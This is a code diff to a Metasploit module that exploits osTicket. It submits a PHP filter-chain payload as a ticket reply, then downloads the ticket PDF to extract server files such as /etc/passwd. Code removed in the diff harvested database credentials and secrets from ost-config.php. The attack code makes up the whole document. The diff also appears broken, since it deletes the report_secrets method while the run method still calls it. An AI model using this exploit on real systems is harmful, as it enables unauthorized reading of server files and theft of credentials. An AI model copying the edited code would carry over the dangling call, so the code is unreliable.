@@ -59,10 +59,10 @@ class MetasploitModule < Msf::Auxiliary
             OptString.new('TICKET_NUMBER', [true, 'Ticket number to use for payload injection (e.g. 978554)']),
             OptString.new('TICKET_ID', [false, 'Internal ticket ID (auto-detected if not set)']),
             OptEnum.new('LOGIN_PORTAL', [true, 'Login portal to use', 'auto', ['auto', 'scp', 'client']]),
-            OptString.new('FILES', [
+            OptString.new('FILE', [
                 true,
-                'Comma-separated list of files to read. Append :b64 or :b64zlib for encoding (e.g. /proc/self/maps:b64zlib)',
-                '/etc/passwd,include/ost-config.php'
+                'Path for file to read.',
+                '/etc/passwd'
             ]),
             OptBool.new('STORE_LOOT', [false, 'Store extracted files as loot', true]),
             OptInt.new('MAX_REDIRECTS', [false, 'Maximum number of HTTP redirect hops to follow', 3]),
@@ -76,91 +76,39 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    auto_set_vhost
-    check_uri = normalize_uri(target_uri)
-    print_status("check: Sending GET to #{check_uri} (RHOST=#{rhost}, RPORT=#{rport}, SSL=#{datastore['SSL']}, VHOST=#{datastore['VHOST']})")
     begin
-      res = send_request_cgi(
-        'method' => 'GET',
-        'uri' => check_uri
+      res = send_request_cgi!(
+        { 'method' => 'GET', 'uri' => normalize_uri(target_uri) },
+        20,
+        datastore['MAX_REDIRECTS']
       )
     rescue ::Rex::ConnectionError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Errno::ETIMEDOUT => e
-      print_error("check: Connection error: #{e.class} - #{e.message}")
       return Exploit::CheckCode::Unknown("Could not connect to target: #{e.message}")
     end
 
-    unless res
-      print_error("check: send_request_cgi returned nil (no response / timeout)")
-      return Exploit::CheckCode::Unknown('Could not connect to target (nil response)')
-    end
+    return Exploit::CheckCode::Unknown('No response from target') unless res
 
-    print_status("check: Got response code=#{res.code}, Content-Type=#{res.headers['Content-Type']}, body=#{res.body.to_s.length} bytes")
-
-    # Follow 301/302 redirects (e.g. / -> /index.php)
-    redirect_limit = datastore['MAX_REDIRECTS']
-    prev_location = nil
-    while [301, 302].include?(res.code) && redirect_limit > 0
-      location = res.headers['Location']
-      break unless location
-
-      print_status("check: Location header: #{location}")
-
-      # Detect redirect loop (same Location repeated)
-      if location == prev_location
-        print_warning("check: Redirect loop detected, stopping")
-        break
-      end
-      prev_location = location
-
-      if location.start_with?('http')
-        parsed = URI.parse(location)
-        redirect_uri = parsed.path.empty? ? '/' : parsed.path
-        # If redirecting to a different host, set VHOST
-        if parsed.host && parsed.host != rhost && datastore['VHOST'].to_s.empty?
-          print_status("check: Redirect points to #{parsed.host}, setting VHOST")
-          datastore['VHOST'] = parsed.host
-        end
-        # If redirecting to HTTPS or a different port, update connection parameters
-        url_ssl = parsed.scheme.downcase == 'https'
-        if datastore['SSL'] != url_ssl
-          datastore['SSL'] = url_ssl
-          disconnect
-          print_status("check: Switched SSL=#{url_ssl} based on redirect")
-        end
-        if parsed.port != datastore['RPORT']
-          datastore['RPORT'] = parsed.port
-          disconnect
-          print_status("check: Switched RPORT=#{parsed.port} based on redirect")
-        end
-      else
-        redirect_uri = location
-      end
-
-      print_status("check: Following #{res.code} redirect to #{redirect_uri}")
-      res = send_request_cgi('method' => 'GET', 'uri' => redirect_uri)
-      break unless res
-
-      redirect_limit -= 1
-    end
-
-    unless is_osticket?(res)
-      return Exploit::CheckCode::Safe('Target does not appear to be an osTicket installation')
-    end
+    return Exploit::CheckCode::Safe('Target does not appear to be an osTicket installation') unless is_osticket?(res)
 
     Exploit::CheckCode::Detected('Target appears to be an osTicket installation')
   end
 
   def run
-    auto_set_vhost
     base_uri = target_uri
-    file_specs = parse_file_specs(datastore['FILES'])
+    file_raw = datastore['FILE'].to_s.strip
 
-    if file_specs.empty?
-      fail_with(Failure::BadConfig, 'No files specified in FILES option')
+    fail_with(Failure::BadConfig, 'No file specified in FILE option') if file_raw.empty?
+
+    if file_raw.include?(':')
+      file_path, file_enc = file_raw.split(':', 2)
+      file_enc = 'plain' unless %w[plain b64 b64zlib].include?(file_enc)
+    else
+      file_path = file_raw
+      file_enc  = 'plain'
     end
 
     print_status("Target: #{rhost}:#{rport}")
-    print_status("Files to extract: #{file_specs.map { |f| f[:path] }.join(', ')}")
+    print_status("File to extract: #{file_path}")
 
     # Step 1: Login
     print_status('Attempting authentication...')
@@ -181,21 +129,19 @@ class MetasploitModule < Msf::Auxiliary
 
     # Step 3: Generate and submit payload
     print_status('Generating PHP filter chain payload...')
-    payload_html = generate_ticket_payload(
-      file_specs.map { |f| f[:encoding] == 'plain' ? f[:path] : "#{f[:path]},#{f[:encoding]}" },
-      true # is_reply
-    )
-    print_status("Payload generated (#{payload_html.length} bytes for #{file_specs.length} file(s))")
+    file_spec = file_enc == 'plain' ? file_path : "#{file_path},#{file_enc}"
+    payload_html = generate_ticket_payload([file_spec], true)
+    print_status("Payload generated (#{payload_html.length} bytes)")
 
     print_status('Submitting payload as ticket reply...')
     reply_ok = submit_ticket_reply(base_uri, prefix, ticket_id, payload_html, cookies)
     if reply_ok
       print_good('Reply posted successfully')
     else
-      print_warning('Reply submission did not return expected confirmation. Continuing to PDF download...')
+      print_warning('Reply submission did not return expected confirmation. Continuing...')
     end
 
-    # Step 4: Download PDF and extract
+    # Step 4: Download PDF
     print_status('Downloading ticket PDF...')
     pdf_data = download_ticket_pdf(base_uri, prefix, ticket_id, cookies, datastore['MAX_REDIRECTS'] || 3)
     if pdf_data.nil?
@@ -203,110 +149,62 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good("PDF downloaded (#{pdf_data.length} bytes)")
 
-    # Step 5: Extract files from PDF
-    print_status('Extracting files from PDF...')
+    # Step 5: Extract file from PDF
+    print_status('Extracting file from PDF...')
     extracted = extract_files_from_pdf(pdf_data)
     if extracted.empty?
-      print_error('No files could be extracted from the PDF')
+      print_error('No file could be extracted from the PDF')
       if datastore['STORE_LOOT']
         path = store_loot('osticket.pdf', 'application/pdf', rhost, pdf_data, 'ticket.pdf', 'Raw PDF export')
         print_status("Raw PDF saved as loot: #{path}")
       end
       return
     end
-    print_good("Extracted #{extracted.length} file(s) from PDF")
+    content = extracted.last
+    print_good("Extracted #{content.length} bytes")
 
-    # Step 6: Display and store results
+    # Step 6: Display and store result
+    safe_name = file_path.tr('/', '_').sub(/\A_+/, '')
     print_line
     print_line('=' * 70)
     print_line('EXTRACTED FILE CONTENTS')
     print_line('=' * 70)
+    print_line
+    print_line("--- [#{file_path}] (#{content.length} bytes) ---")
 
-    extracted.each_with_index do |content, i|
-      file_label = i < file_specs.length ? file_specs[i][:path] : "file_#{i + 1}"
-      safe_name = file_label.split(',').first.tr('/', '_').sub(/\A_+/, '')
-
-      print_line
-      print_line("--- [#{file_label}] (#{content.length} bytes) ---")
-
-      begin
-        text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')
-        text.sub!(/[\x00-\x08\x0e-\x1f].*\z/m, '') # Strip trailing BMP padding artifacts
-        if text.length > 3000
-          print_line(text[0, 3000])
-          print_line("\n... (truncated)")
-        else
-          print_line(text)
-        end
-      rescue EncodingError
-        print_line('[Binary data]')
+    begin
+      text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')
+      text.sub!(/[\x00-\x08\x0e-\x1f].*\z/m, '') # Strip trailing BMP padding artifacts
+      if text.length > 3000
+        print_line(text[0, 3000])
+        print_line("\n... (truncated)")
+      else
+        print_line(text)
       end
+    rescue EncodingError
+      print_line('[Binary data]')
+    end
 
-      next unless datastore['STORE_LOOT']
-
+    if datastore['STORE_LOOT']
       path = store_loot(
         "osticket.#{safe_name}",
         'application/octet-stream',
         rhost,
         content,
         safe_name,
-        "File read from osTicket server: #{file_label}"
+        "File read from osTicket server: #{file_path}"
       )
       print_good("Saved to: #{path}")
     end
 
     # Look for key secrets in ost-config.php
-    report_secrets(extracted)
+    report_secrets([content])
 
     print_line
     print_good('Exploitation complete')
   end
 
   private
-
-  
-  def auto_set_vhost
-    rhosts_val = datastore['RHOSTS'].to_s
-    return unless rhosts_val.match?(%r{\Ahttps?://}i)
-
-    parsed = URI.parse(rhosts_val)
-    return unless parsed.host
-
-    # VHOST: set hostname for Host header if it differs from resolved IP
-    if datastore['VHOST'].to_s.empty? && parsed.host != rhost
-      datastore['VHOST'] = parsed.host
-      print_status("Auto-set VHOST=#{parsed.host} from RHOSTS URL")
-    end
-
-    # RPORT: derive from URL (explicit port or scheme default)
-    url_port = parsed.port # URI.parse returns 80/443 as defaults for http/https
-    if url_port && url_port != datastore['RPORT']
-      datastore['RPORT'] = url_port
-      print_status("Auto-set RPORT=#{url_port} from RHOSTS URL")
-    end
-
-    # SSL: derive from scheme
-    url_ssl = parsed.scheme.downcase == 'https'
-    if datastore['SSL'] != url_ssl
-      datastore['SSL'] = url_ssl
-      print_status("Auto-set SSL=#{url_ssl} from RHOSTS URL")
-    end
-  end
-
-  # Parses the FILES datastore option into an array of { path:, encoding: } hashes.
-  def parse_file_specs(files_str)
-    files_str.split(',').map(&:strip).reject(&:empty?).map do |spec|
-      if spec.include?(':')
-        path, enc = spec.split(':', 2)
-        enc = 'plain' unless %w[plain b64 b64zlib].include?(enc)
-      else
-        path = spec
-        enc = 'plain'
-      end
-      { path: path, encoding: enc }
-    end
-  end
-
   # Attempts login via the configured portal (auto tries SCP first, then client).
   # Returns [portal_type, cookies] or [nil, nil].
   def do_login(base_uri)
@@ -347,79 +245,4 @@ class MetasploitModule < Msf::Auxiliary
     find_ticket_id(base_uri, prefix, datastore['TICKET_NUMBER'], cookies, datastore['MAX_TICKET_ID'] || 20)
   end
 
-  # Searches extracted file contents for osTicket configuration secrets and reports them.
-  def report_secrets(extracted)
-    secret_patterns = {
-      'SECRET_SALT' => /define\('SECRET_SALT','([^']+)'\)/,
-      'ADMIN_EMAIL' => /define\('ADMIN_EMAIL','([^']+)'\)/,
-      'DBHOST' => /define\('DBHOST','([^']+)'\)/,
-      'DBNAME' => /define\('DBNAME','([^']+)'\)/,
-      'DBUSER' => /define\('DBUSER','([^']+)'\)/,
-      'DBPASS' => /define\('DBPASS','([^']+)'\)/
-    }
-
-    found_any = false
-
-    extracted.each do |content|
-      text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '') rescue next
-
-      secret_patterns.each do |key, pattern|
-        match = text.match(pattern)
-        next unless match
-
-        unless found_any
-          print_line
-          print_line('=' * 70)
-          print_line('KEY FINDINGS')
-          print_line('=' * 70)
-          found_any = true
-        end
-        print_good("  #{key}: #{match[1]}")
-
-        # Report credentials to the database
-        case key
-        when 'DBUSER'
-          # Will be paired with DBPASS below
-        when 'DBPASS'
-          db_user_match = text.match(/define\('DBUSER','([^']+)'\)/)
-          if db_user_match
-            report_cred(db_user_match[1], match[1], 'osTicket database')
-          end
-        when 'ADMIN_EMAIL'
-          report_note(
-            host: rhost,
-            port: rport,
-            type: 'osticket.admin_email',
-            data: { email: match[1] }
-          )
-        when 'SECRET_SALT'
-          report_note(
-            host: rhost,
-            port: rport,
-            type: 'osticket.secret_salt',
-            data: { salt: match[1] }
-          )
-        end
-      end
-    end
-  end
-
-  # Reports a credential pair to the Metasploit database.
-  def report_cred(username, password, service_name)
-    credential_data = {
-      module_fullname: fullname,
-      workspace_id: myworkspace_id,
-      origin_type: :service,
-      address: rhost,
-      port: rport,
-      protocol: 'tcp',
-      service_name: service_name,
-      username: username,
-      private_data: password,
-      private_type: :password
-    }
-    create_credential(credential_data)
-  rescue StandardError => e
-    vprint_error("Failed to store credential: #{e}")
-  end
 end
